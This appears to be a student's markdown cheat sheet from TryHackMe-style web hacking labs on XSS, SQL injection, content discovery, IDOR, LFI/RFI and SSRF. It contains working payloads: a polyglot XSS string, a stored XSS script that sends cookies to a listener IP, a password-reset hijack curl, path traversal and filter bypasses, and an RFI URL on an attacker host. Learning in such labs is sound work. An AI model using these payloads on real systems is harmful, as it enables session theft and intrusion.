<span style="color:rgb(255, 255, 0)">XSS Injection</span>
**Replace the alert(THM) in the Main code with whatever XSS type, switch the IP Address with the attackbox IP Address and make sure to use the same port to listen using (nc -nlvp 9001)

Main code:
    `````
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
    
Stored XSS code (for support tickets and admin review):
```
    <script>fetch('http://10.49.96.188:9001?cookie=' + btoa(document.cookie) );</script>
```


<span style="color:rgb(255, 255, 0)">SQL Injection</span>
sqlmap: tool used for sql injection
    `--wizard`: guides with each step by asking questions
    `--dbs`: extract databases names 
    `-D database_name --tables`: extract information about tables of that db
    `-D database_name -T table_name --dump`:enumerate records from a table
    `--cookie="SESSIONID=abcdef123456"`: when testing if a website is vulnerable to sql injection attack when the url doesnt look like: /search?cat=1. we use the -u flag to test for web pages with a URL that uses GET parameter like the example /search?cat=1
- sqlmap -r intercepted_request.txt: POST-based testing used in login forms, intercept the post request and paste it into a txt file


<span style="color:rgb(255, 255, 0)">Content discovery</span>:
- <span style="color:rgb(232, 150, 150)">common directories like:</span>
    /robots.txt : restrics what search engine crawlers can look at
    /sitemap.xml : every file that the owner wishes to be listed on a search engine

- <span style="color:rgb(232, 150, 150)">curl</span>: command-line tool for transferring data to or from a server using various network protocols, we can use it with the url of the website + /images/favicon.ico | md5sum to see what framework the favicon belongs to in
 (https://wiki.owasp.org/index.php/OWASP_favicon_database) and then exploit it.
 (also using curl url and adding -v shows http header details)
 
   Authentication bypass example:
   `curl 'http://10.112.134.214/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
    (-H adds content to the http header)

- <span style="color:rgb(232, 150, 150)">Google dorking</span>: (site: / inurl: / intitle: / filetype:)
- <span style="color:rgb(232, 150, 150)">Wappalyzer</span>: browser extension and tool that shows what technologies, frameworks, and more that a website uses
- <span style="color:rgb(232, 150, 150)">Wayback machine</span>: shows all times the service scraped a website and saved the contents
- <span style="color:rgb(232, 150, 150)">S3 Buckets</span>: http(s)://{name}.s3.amazonaws.com


<span style="color:rgb(255, 255, 0)">IDOR</span>:
- like changing a URL value: ?user_id=1300 to ?user_id=1000 (can be hidden inside inspector -> network menu aswell)

<span style="color:rgb(255, 255, 0)">LFI</span>:
- The process of retrieving or uploading files into a web server that might appear in the url of the web page
- <span style="color:rgb(146, 208, 80)">Path traversal (directory traversal)</span>: allows an attacker to read operating system resources such as local files on the server running an application, vulnerability happens if user input is passed to file_get_contents function in php. Attack can be used by adding `../../../etc/passwd` to the url (because we start at /var/www/app and we wanna go up to /)
    For windows: `http://webapp.thm/get.php?file=../../../../boot.ini`
    Or: `http://webapp.thm/get.php?file=../../../../windows/win.ini`

- <span style="color:rgb(146, 208, 80)">LFI:</span> we look at php functions like include, require, include_once, require_once to calculate how many ../ do i have to put in the URL, because the code could have extra directories embedded inside the function like 
  `include("languages/". $_GET['lang']);` in this case there is languages/ so we do ../ 4 times instead of 3 to reach /etc/passwd
    - if the include function automatically adds an extension to the input like `/etc/passwd.php` we can bypass this by adding to our input `%00` (null byte the terminates a string), this only works below PHP 5.3.4 (sometimes it only works in the url)
    - we can bypass filters (if /etc/passwd is filtered) by adding /. to the end because it stays in the same directory unlike /.. 
    - if `../` is filtered we bypass by using `....//....//....//etc/passwd`
    - `/../../proc/self/cmdline`: to identify the running processes and the absolute path of the web application (app.py)

- <span style="color:rgb(146, 208, 80)">RFI</span>: allows an attacker to inject an external URL into the include function, one requirement is that the `allow_url_fopen` option needs to be on
    `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
    we can do RFI by starting python3 -m http.server 9000 on a tab and input in the form `http:<ip>:port/file.txt` (works with shell too)


<span style="color:rgb(255, 255, 0)">SSRF</span>:
- (Server-side Request Forgery), cause the server-side application to make requests to a destination of the attacker's choosing